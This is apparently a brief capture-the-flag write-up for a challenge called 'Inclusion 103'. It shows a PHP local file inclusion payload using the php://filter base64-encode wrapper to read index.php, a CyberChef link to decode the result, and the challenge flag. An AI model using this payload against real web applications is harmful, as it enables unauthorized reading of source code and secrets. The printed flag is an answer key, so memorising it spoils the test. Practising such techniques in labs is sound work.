# Inclusion 103
Use php filter to get the source code as base64 and then decode it with Cyberchef   
http://chal2.hackademy.ctf/?page=php://filter/convert.base64-encode/resource=index.php   


https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&   


``FLAG-H7Mikt1w5p8XYvHaHklneQq0BDX4CGVu``
